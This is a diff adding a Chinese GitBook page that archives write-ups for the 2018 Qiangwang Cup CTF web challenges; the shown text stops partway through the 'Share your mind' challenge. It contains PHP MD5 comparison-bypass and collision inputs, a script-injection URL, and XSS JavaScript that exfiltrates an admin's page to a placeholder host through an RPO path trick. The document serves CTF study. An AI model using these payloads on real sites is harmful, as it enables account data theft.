@@ -1,0 +1,1407 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>2018强网杯Web · CTF Writeup</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Yunen <yunen@cqu.edu.cn>">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchors/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="2018ddctf.html" />
+    
+    
+    <link rel="prev" href="all.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="/" target="_blank" class="custom-link">首页</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../types/">
+            
+                <a href="../types/">
+            
+                    
+                    按类型区分
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../types/web.html">
+            
+                <a href="../types/web.html">
+            
+                    
+                    网上练习题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../types/comp.html">
+            
+                <a href="../types/comp.html">
+            
+                    
+                    官方赛事题
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../years/">
+            
+                <a href="../years/">
+            
+                    
+                    按年份区分
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../years/2020.html">
+            
+                <a href="../years/2020.html">
+            
+                    
+                    2019-2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../years/2019.html">
+            
+                <a href="../years/2019.html">
+            
+                    
+                    2018-2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../years/2018.html">
+            
+                <a href="../years/2018.html">
+            
+                    
+                    2017-2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../years/2017.html">
+            
+                <a href="../years/2017.html">
+            
+                    
+                    2016-2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../years/2016.html">
+            
+                <a href="../years/2016.html">
+            
+                    
+                    2015-2016
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../years/2015.html">
+            
+                <a href="../years/2015.html">
+            
+                    
+                    ????-2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../difficult/">
+            
+                <a href="../difficult/">
+            
+                    
+                    按难度区分
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../difficult/easy.html">
+            
+                <a href="../difficult/easy.html">
+            
+                    
+                    相对简单
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../difficult/mid.html">
+            
+                <a href="../difficult/mid.html">
+            
+                    
+                    难度中等
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../difficult/diff.html">
+            
+                <a href="../difficult/diff.html">
+            
+                    
+                    难度较大
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="all.html">
+            
+                <a href="all.html">
+            
+                    
+                    目前已收录
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.5.1" data-path="2018qiangwang.html">
+            
+                <a href="2018qiangwang.html">
+            
+                    
+                    2018强网杯Web
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="2018ddctf.html">
+            
+                <a href="2018ddctf.html">
+            
+                    
+                    2018DDCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="2019national.html">
+            
+                <a href="2019national.html">
+            
+                    
+                    2019全国信安赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="2019ddctf.html">
+            
+                <a href="2019ddctf.html">
+            
+                    
+                    2019DDCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="2017national.html">
+            
+                <a href="2017national.html">
+            
+                    
+                    2017全国信安赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="2019xihulunjian.html">
+            
+                <a href="2019xihulunjian.html">
+            
+                    
+                    2019西湖论剑预选赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="shiyanbar_web.html">
+            
+                <a href="shiyanbar_web.html">
+            
+                    
+                    实验吧web部分
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../help.html">
+            
+                <a href="../help.html">
+            
+                    
+                    加入我们完善网站!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../reply.html">
+            
+                <a href="../reply.html">
+            
+                    
+                    有问题?请在这里反馈!
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >2018强网杯Web</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;web"><b>1. </b>2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;Web</a></li><ul><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><b>1.1. </b>&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</a></li></ul><li><span class="title-icon "></span><a href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><b>2. </b>&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><b>3. </b>&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</a></li><li><span class="title-icon "></span><a href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><b>4. </b>&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</a></li><ul><li><span class="title-icon "></span><a href="#web"><b>4.1. </b>Web</a></li><ul><li><span class="title-icon "></span><a href="#web&#x7B7E;&#x5230;"><b>4.1.1. </b>web&#x7B7E;&#x5230;</a></li><li><span class="title-icon "></span><a href="#share-your-mind"><b>4.1.2. </b>Share your mind</a></li><li><span class="title-icon "></span><a href="#three-hit"><b>4.1.3. </b>Three hit</a></li><li><span class="title-icon "></span><a href="#wechat"><b>4.1.4. </b>Wechat</a></li><li><span class="title-icon "></span><a href="#&#x6559;&#x80B2;&#x673A;&#x6784;"><b>4.1.5. </b>&#x6559;&#x80B2;&#x673A;&#x6784;</a></li><li><span class="title-icon "></span><a href="#python-is-the-best-language"><b>4.1.6. </b>Python is the best language</a></li></ul></ul></ul></div><a href="#2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;web" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;web"><a name="2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;web" class="anchor-navigation-ex-anchor" href="#2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;web"><i class="fa fa-link" aria-hidden="true"></i></a>1. 2018&#x7B2C;&#x4E8C;&#x5C4A;&#x5F3A;&#x7F51;&#x676F;&#x7EBF;&#x4E0A;&#x8D5B;Web</h1>
+<h2 id="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">&#x7C7B;&#x578B;</th>
+<th style="text-align:center">&#x5E74;&#x4EFD;</th>
+<th style="text-align:center">&#x96BE;&#x5EA6;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">&#x5B98;&#x65B9;&#x8D5B;&#x4E8B;&#x9898;</td>
+<td style="text-align:center">2018</td>
+<td style="text-align:center">&#x96BE;</td>
+</tr>
+</tbody>
+</table>
+<h1 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><a name="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>2. &#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</h1>
+<ul>
+<li><a href="http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html" target="_blank">http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html</a></li>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html" target="_blank">https://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html</a></li>
+<li><a href="https://xz.aliyun.com/t/2219" target="_blank">https://xz.aliyun.com/t/2219</a></li>
+<li><a href="http://pupiles.com/qiangwangbei.html" target="_blank">http://pupiles.com/qiangwangbei.html</a></li>
+</ul>
+<h1 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><a name="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>3. &#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h1>
+<ul>
+<li>&#x6682;&#x65E0;</li>
+</ul>
+<h1 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><a name="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>4. &#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h1>
+<p><strong>&#x611F;&#x8C22;&#x4F5C;&#x8005;&#xFF1A;l3m0n&#x3001;FlappyPig&#x3001;Pupil</strong></p>
+<h2 id="web"><a name="web" class="anchor-navigation-ex-anchor" href="#web"><i class="fa fa-link" aria-hidden="true"></i></a>4.1. Web</h2>
+<h3 id="web&#x7B7E;&#x5230;"><a name="web&#x7B7E;&#x5230;" class="anchor-navigation-ex-anchor" href="#web&#x7B7E;&#x5230;"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.1. web&#x7B7E;&#x5230;</h3>
+<p>&#x7B2C;&#x4E00;&#x5C42;&#xFF1A;</p>
+<pre><code>&lt;!--
+    if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;])){
+            die(&quot;success!&quot;);
+    }
+--&gt;
+</code></pre><p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;2&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7ED5;&#x8FC7;</p>
+<p><code>param1=240610708&amp;param2=QNKCDZO</code></p>
+<p>&#x7B2C;&#x4E8C;&#x5C42;:</p>
+<pre><code>&lt;!--
+    if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){
+            die(&quot;success!&quot;);
+        }
+--&gt;
+</code></pre><p>&#x4F7F;&#x7528;&#x4E86;&#x5F3A;&#x7B49;&#x4E8E;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;</p>
+<p><code>param1[]=1&amp;param2[]=2</code><br>&#x4F7F;&#x7528;&#x4E86;&#x5F3A;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x5316;<br>&#x4E00;&#x756A;&#x8C37;&#x6B4C;&#x540E;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x53BB;&#x5E74;BKPCTF&#x6539;&#x7684;&#x4E00;&#x9053;&#x9898;<br>payload&#x5982;&#x4E0B;:</p>
+<pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+
+Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre><blockquote>
+<p>&#x6CE8;&#xFF1A;&#x4E0A;&#x8FF0;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x5176;md5&#x52A0;&#x5BC6;&#x540E;&#x5BC6;&#x6587;&#x76F8;&#x540C;&#x3002;</p>
+</blockquote>
+<h3 id="share-your-mind"><a name="share-your-mind" class="anchor-navigation-ex-anchor" href="#share-your-mind"><i class="fa fa-link" aria-hidden="true"></i></a>4.1.2. Share your mind</h3>
+<p>&#x8FD9;&#x9898;&#x5FC5;&#x987B;&#x8981;&#x5199;&#x4E00;&#x4E0B;&#x81EA;&#x5DF1;&#x7684;&#x8E29;&#x5751;&#x7ECF;&#x5386;&#xFF0C;&#x9996;&#x5148;&#x8FDB;&#x53BB;&#x6D4F;&#x89C8;&#x4E00;&#x4E0B;&#x9875;&#x9762;&#x529F;&#x80FD;&#xFF0C;&#x6709;&#x4E2A;&#x63D0;&#x4EA4;bug&#x9875;&#x9762;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x8FD8;&#x6709;&#x4E2A;&#x53EF;&#x4EE5;&#x65B0;&#x5EFA;&#x6587;&#x7AE0;&#x7684;&#x5730;&#x65B9;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q15.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q15.PNG" alt="">
+     </a></p>
+<p>&#x6700;&#x540E;&#x5C31;&#x662F;&#x6D4F;&#x89C8;&#x6587;&#x7AE0;(&#x4F46;&#x662F;&#x53EA;&#x80FD;&#x6D4F;&#x89C8;&#x81EA;&#x5DF1;&#x53D1;&#x7684;&#x6587;&#x7AE0;)&#xFF0C;&#x9996;&#x5148;&#x60F3;&#x5230;&#x7684;&#x5C31;&#x662F;xss+csrf&#xFF0C;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;&#x5F15;&#x7528;&#x4E00;&#x6BB5;JS&#x7136;&#x540E;&#x53D1;&#x7ED9;bot&#xFF0C;&#x7136;&#x540E;ajax&#x8BF7;&#x6C42;admin&#x7684;&#x6587;&#x7AE0;&#x53D1;&#x56DE;&#x6765;&#x3002;&#x53EF;&#x662F;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x5728;&#x65B0;&#x5EFA;&#x6587;&#x7AE0;&#x9875;&#x9762;&#x6211;&#x4EEC;&#x7684;<code>&lt;&gt;</code>&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x6784;&#x9020;&#x4E00;&#x4E2A;js&#x3002;&#x731C;&#x60F3;&#x80FD;&#x4E0D;&#x80FD;&#x5728;report&#x9875;&#x9762;&#x91CC;&#x8FDB;&#x884C;xss&#xFF0C;&#x4F46;&#x662F;&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EA;&#x80FD;&#x50CF;&#x81EA;&#x5DF1;&#x7F51;&#x7AD9;&#x7684;&#x5730;&#x5740;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x662F;&#x201D;&#x5C45;&#x7136;&#x201D;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;!!!!!!,payload:</p>
+<p><code>http://39.107.33.96:20000/index.php/report/&lt;script src=&quot;xxxxxx.com&quot;&gt;&lt;/script&gt;</code></p>
+<p>&#x4E8E;&#x662F;&#x65E0;&#x5C3D;&#x7684;&#x8E29;&#x5751;&#x4E4B;&#x65C5;&#x5F00;&#x59CB;&#x4E86;&#xFF0C;&#x9996;&#x5148;&#x662F;bot&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x6CA1;&#x6709;cookie&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x4E5F;&#x6CA1;&#x5728;&#x610F;&#x4EE5;&#x4E3A;&#x8BBE;&#x7F6E;&#x4E86;httponly,(&#x540E;&#x6765;&#x5927;&#x81F4;&#x660E;&#x767D;bot&#x8FC7;&#x7A0B;&#x4E86;,&#x5148;check url-&#x672A;&#x8BFB;,&#x7136;&#x540E;add_cookie-&#x5DF2;&#x8BFB;&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x7528;<code>&lt;script&gt;</code>&#x6807;&#x7B7E;&#x5176;&#x5B9E;&#x662F;&#x5728;add_cookie&#x4E4B;&#x524D;&#x5C31;&#x8FD4;&#x56DE;&#x4E86;&#x6240;&#x4EE5;&#x4E0D;&#x5E26;cookie)&#x8BA9;&#x4ED6;AJAX&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;admin&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;index.php/view/article/1&apos;, false);
+a.send(null);
+b = a.responseText;
+(new Image()).src = &apos;http://xxxxx/?flag=&apos; + escape(b);
+</code></pre><p>&#x7ED3;&#x679C;bot&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x662F;&#x672A;&#x767B;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x5C31;&#x5F88;&#x61F5;&#x903C;&#xFF0C;&#x540E;&#x6765;&#x7ED9;&#x4E86;<code>hint1:phantomjs/2.1.1</code>&#x7ED3;&#x679C;&#x8FD9;&#x63D0;&#x793A;&#x7ED9;&#x4E86;&#x4EE5;&#x540E;&#x6211;&#x5C31;&#x4EE5;&#x4E3A;&#x662F;&#x65E5;bot&#xFF0C;&#x5404;&#x79CD;&#x8C37;&#x6B4C;&#x627E;2.1.1&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x76F4;&#x5230;&#x4E0B;&#x5348;&#x51FA;&#x4E86;hint2:&#x6F0F;&#x6D1E;&#x70B9;&#x4E0D;&#x5728;report&#x2026;&#x63A8;&#x7FFB;&#x4E86;&#x4E00;&#x4E2A;&#x4E0B;&#x5348;&#x7684;&#x52AA;&#x529B;&#x6210;&#x679C;&#x3002;&#x4E00;&#x76F4;&#x5230;&#x665A;&#x4E0A;&#x6211;&#x624D;&#x60F3;&#x8D77;&#x6765;index&#x9875;&#x9762;&#x6709;&#x4E00;&#x4E2A;<code>../static/js/bootstrap.min.js</code>&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x5F15;&#x7528;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q12.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q12.PNG" alt="">
+     </a></p>
+<p>&#x60F3;&#x8D77;&#x6765;&#x5BD2;&#x5047;&#x65F6;&#x5019;&#x770B;&#x7684;rpo&#xFF0C;&#x5173;&#x4E8E;rpo&#x7684;&#x539F;&#x7406;&#x8FD9;&#x91CC;&#x4E0D;&#x60F3;&#x8D58;&#x8FF0;&#x4E86;&#xFF0C;&#x7ED9;&#x4E2A;&#x8FDE;&#x63A5;</p>
+<blockquote>
+<p><a href="https://open.appscan.io/article-462.html" target="_blank">https://open.appscan.io/article-462.html</a></p>
+</blockquote>
+<p>&#x8FD9;&#x91CC;&#x6587;&#x7AE0;&#x67E5;&#x770B;&#x9875;&#x9762;&#x6CA1;&#x6709;&#x5F15;&#x7528;DOCTYPE html&#xFF0C;&#x6240;&#x4EE5;&#x5B58;&#x5728;rpo&#x6F0F;&#x6D1E;,&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;,&#x6587;&#x7AE0;title&#x4E3A;&#x7A7A;(title&#x4E0D;&#x4E3A;&#x7A7A;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;<code>&lt;h1&gt;</code>&#x6807;&#x7B7E;&#x5BFC;&#x81F4;&#x6D4F;&#x89C8;&#x5668;&#x89E3;&#x6790;js&#x7684;&#x65F6;&#x5019;&#x62A5;&#x9519;</p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q13.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q13.PNG" alt="">
+     </a></p>
+<p>&#x5185;&#x5BB9;&#x8F93;&#x5165;js&#x4EE3;&#x7801;&#x6BD4;&#x5982;<code>alert(1)</code></p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q10.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q10.PNG" alt="">
+     </a></p>
+<p>&#x7136;&#x540E;&#x8BBF;&#x95EE;&#x8FD9;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php</code></p>
+<p>     <a href="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q11.PNG" rel="grouped" title="" target="_blank" class="fancybox">
+       <img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/q11.PNG" alt="">
+     </a></p>
+<p>&#x628A;635&#x66FF;&#x6362;&#x6210;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x4EE3;&#x7801;,&#x8FD9;&#x91CC;&#x5BF9;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#x8BBF;&#x95EE;&#x7684;&#x662F;</p>
+<p><code>http://39.107.33.96:20000/index.php</code></p>
+<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x6765;&#x8BF4;&#x4ED6;&#x8BBF;&#x95EE;&#x7684;&#x5C31;&#x662F;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php</code></p>
+<p>&#x7136;&#x540E;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x53D1;&#x8D77;js&#x8BF7;&#x6C42;&#x53BB;&#x8BF7;&#x6C42;&#x539F;&#x672C;index.php&#x4F1A;&#x52A0;&#x8F7D;&#x7684;<code>../static/js/bootstrap.min.js</code>&#x5C31;&#x662F;&#x5411;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/635/..%2f..%2f..%2f..%2findex.php/../static/js/bootstrap.min.js</code></p>
+<p>&#x76F8;&#x5F53;&#x4E8E;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/635/static/bootstrap.min.js</code></p>
+<p>&#x8FD9;&#x91CC;&#x8BBF;&#x95EE;&#x7684;&#x7ED3;&#x679C;&#x548C;&#x8BBF;&#x95EE;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/635/</code></p>
+<p>&#x4E5F;&#x5C31;&#x662F;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x7684;&#x5185;&#x5BB9;&#x662F;&#x4E00;&#x6837;&#x7684;(&#x4E0D;&#x660E;&#x767D;&#x7684;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x672C;&#x5730;&#x6D4B;&#x8BD5;)&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x662F;&#x4EE5;js&#x5F15;&#x64CE;&#x53BB;&#x89E3;&#x6790;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4F1A;&#x628A;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x5F53;&#x6210;&#x4E00;&#x6BB5;js&#x53BB;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;<code>&lt;&gt;</code>&#x7684;&#x8FC7;&#x6EE4;&#x6267;&#x884C;xss&#x4E86;&#x3002;</p>
+<p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E3A;</p>
+<pre><code>var a = new XMLHttpRequest();
+a.open(&apos;GET&apos;, &apos;yourvpsip&apos;, false);
+a.send(null);
+</code></pre><p>&#x7136;&#x540E;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/22957/..%2f..%2f..%2f..%2findex.php</code></p>
